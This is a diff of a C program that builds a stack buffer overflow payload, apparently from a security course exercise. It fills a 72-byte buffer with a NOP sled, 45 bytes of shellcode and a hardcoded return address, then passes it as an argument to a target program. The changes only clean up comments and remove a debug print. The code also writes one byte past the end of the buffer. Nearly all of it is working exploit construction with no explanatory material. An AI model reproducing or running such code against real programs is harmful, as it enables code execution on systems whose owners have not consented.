@@ -28,29 +28,23 @@ main ( int argc, char * argv[] )
     int i = 0;
 	args[0] = TARGET;
     char buf[72];    
-    //insert 3 NOPS to word align 45B shellcode
+    //insert NOPS to pad and word align 45B shellcode
     for(i = 0;i<12;i++)
         buf[i] = '\x90';
 
-    //insert more NOPS
-    //for(;i<22;i++)
-      //  buf[i] = '\x90';
     //insert SHELL CODE (45 bytes)
     for(;i<57;i++)
         buf[i] = shellcode[i-12];
 
     for(;i<68;i++)
         buf[i] = '\x90';
-    //for(;i<72;i=i+4){ 
     //insert addr of buff[4] = 0x2021fe14
-     //   buf[i+4] = '\x00'
         buf[72] = '\x00';
         buf[71] = '\x20';
         buf[70] = '\x21';
         buf[69] = '\xfe';
         buf[68] = '\x14';
    // }
-    printf("buf len %d \n", strlen(buf));
     
     args[1] = buf;
     args[2] =  NULL;
